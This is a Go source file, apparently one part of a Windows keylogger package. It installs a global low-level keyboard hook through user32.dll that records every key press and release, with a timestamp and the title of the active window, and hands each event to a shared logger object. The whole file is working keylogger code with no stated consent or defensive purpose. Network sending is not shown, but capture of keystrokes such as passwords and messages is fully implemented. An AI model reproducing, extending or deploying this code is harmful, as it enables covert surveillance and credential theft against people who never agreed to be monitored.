//go:build windows

package keylogger

import (
	"fmt"
	"syscall"
	"time"
	"unsafe"
)

const (
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 0x0100
	WM_KEYUP       = 0x0101
	WM_SYSKEYDOWN  = 0x0104
	WM_SYSKEYUP    = 0x0105
)

var (
	user32                     = syscall.NewLazyDLL("user32.dll")
	kernel32                   = syscall.NewLazyDLL("kernel32.dll")
	procSetWindowsHookEx       = user32.NewProc("SetWindowsHookExW")
	procLowLevelKeyboardProc   = user32.NewProc("CallNextHookEx")
	procUnhookWindowsHookEx    = user32.NewProc("UnhookWindowsHookEx")
	procGetMessage             = user32.NewProc("GetMessageW")
	procGetModuleHandle        = kernel32.NewProc("GetModuleHandleW")
	procGetForegroundWindow    = user32.NewProc("GetForegroundWindow")
	procGetWindowText          = user32.NewProc("GetWindowTextW")
	procGetWindowTextLength    = user32.NewProc("GetWindowTextLengthW")

	keyboardHook uintptr
)

type POINT struct {
	X, Y int32
}

type MSG struct {
	HWND    uintptr
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      POINT
}

type KBDLLHOOKSTRUCT struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

// Virtual key code to string mapping
var vkCodeMap = map[uint32]string{
	0x08: "Backspace",
	0x09: "Tab",
	0x0D: "Enter",
	0x10: "Shift",
	0x11: "Ctrl",
	0x12: "Alt",
	0x13: "Pause",
	0x14: "CapsLock",
	0x1B: "Escape",
	0x20: "Space",
	0x21: "PageUp",
	0x22: "PageDown",
	0x23: "End",
	0x24: "Home",
	0x25: "Left",
	0x26: "Up",
	0x27: "Right",
	0x28: "Down",
	0x2C: "PrintScreen",
	0x2D: "Insert",
	0x2E: "Delete",
	0x5B: "LeftWin",
	0x5C: "RightWin",
	0x5D: "Menu",
	0x60: "Numpad0",
	0x61: "Numpad1",
	0x62: "Numpad2",
	0x63: "Numpad3",
	0x64: "Numpad4",
	0x65: "Numpad5",
	0x66: "Numpad6",
	0x67: "Numpad7",
	0x68: "Numpad8",
	0x69: "Numpad9",
	0x6A: "NumpadMultiply",
	0x6B: "NumpadAdd",
	0x6D: "NumpadSubtract",
	0x6E: "NumpadDecimal",
	0x6F: "NumpadDivide",
	0x70: "F1",
	0x71: "F2",
	0x72: "F3",
	0x73: "F4",
	0x74: "F5",
	0x75: "F6",
	0x76: "F7",
	0x77: "F8",
	0x78: "F9",
	0x79: "F10",
	0x7A: "F11",
	0x7B: "F12",
	0x90: "NumLock",
	0x91: "ScrollLock",
	0xA0: "LeftShift",
	0xA1: "RightShift",
	0xA2: "LeftCtrl",
	0xA3: "RightCtrl",
	0xA4: "LeftAlt",
	0xA5: "RightAlt",
	0xBA: ";",
	0xBB: "=",
	0xBC: ",",
	0xBD: "-",
	0xBE: ".",
	0xBF: "/",
	0xC0: "`",
	0xDB: "[",
	0xDC: "\\",
	0xDD: "]",
	0xDE: "'",
}

// Low-level keyboard hook procedure
func lowLevelKeyboardProc(nCode int, wParam uintptr, lParam uintptr) uintptr {
	if nCode >= 0 && globalKeylogger != nil && globalKeylogger.isRunning {
		switch wParam {
		case WM_KEYDOWN, WM_SYSKEYDOWN:
			kbdStruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
			key := vkCodeToString(kbdStruct.VkCode)
			window := getActiveWindow()
			
			event := KeyEvent{
				Key:       key,
				Timestamp: time.Now(),
				Window:    window,
				Type:      "keydown",
			}
			
			globalKeylogger.AddEvent(event)
			
		case WM_KEYUP, WM_SYSKEYUP:
			// Optionally capture key up events
			kbdStruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
			key := vkCodeToString(kbdStruct.VkCode)
			window := getActiveWindow()
			
			event := KeyEvent{
				Key:       key,
				Timestamp: time.Now(),
				Window:    window,
				Type:      "keyup",
			}
			
			globalKeylogger.AddEvent(event)
		}
	}
	
	ret, _, _ := procLowLevelKeyboardProc.Call(0, uintptr(nCode), wParam, lParam)
	return ret
}

// Convert virtual key code to string
func vkCodeToString(vkCode uint32) string {
	if key, exists := vkCodeMap[vkCode]; exists {
		return key
	}
	
	// For printable characters (A-Z, 0-9)
	if (vkCode >= 0x30 && vkCode <= 0x39) || (vkCode >= 0x41 && vkCode <= 0x5A) {
		return string(rune(vkCode))
	}
	
	return fmt.Sprintf("VK_%d", vkCode)
}

// Get the title of the active window
func getActiveWindow() string {
	hwnd, _, _ := procGetForegroundWindow.Call()
	if hwnd == 0 {
		return "Unknown"
	}
	
	length, _, _ := procGetWindowTextLength.Call(hwnd)
	if length == 0 {
		return "Unknown"
	}
	
	buffer := make([]uint16, length+1)
	procGetWindowText.Call(hwnd, uintptr(unsafe.Pointer(&buffer[0])), length+1)
	
	return syscall.UTF16ToString(buffer)
}

// Start the keyboard hook
func (k *Keylogger) startHook() {
	moduleHandle, _, _ := procGetModuleHandle.Call(0)
	
	keyboardHook, _, _ = procSetWindowsHookEx.Call(
		WH_KEYBOARD_LL,
		syscall.NewCallback(lowLevelKeyboardProc),
		moduleHandle,
		0,
	)
	
	if keyboardHook == 0 {
		return
	}
	
	// Message loop
	var msg MSG
	for k.isRunning {
		ret, _, _ := procGetMessage.Call(
			uintptr(unsafe.Pointer(&msg)),
			0,
			0,
			0,
		)
		
		if ret == 0 || ret == ^uintptr(0) { // WM_QUIT or error
			break
		}
	}
}

// Stop the keyboard hook
func (k *Keylogger) stopHook() {
	if keyboardHook != 0 {
		procUnhookWindowsHookEx.Call(keyboardHook)
		keyboardHook = 0
	}
}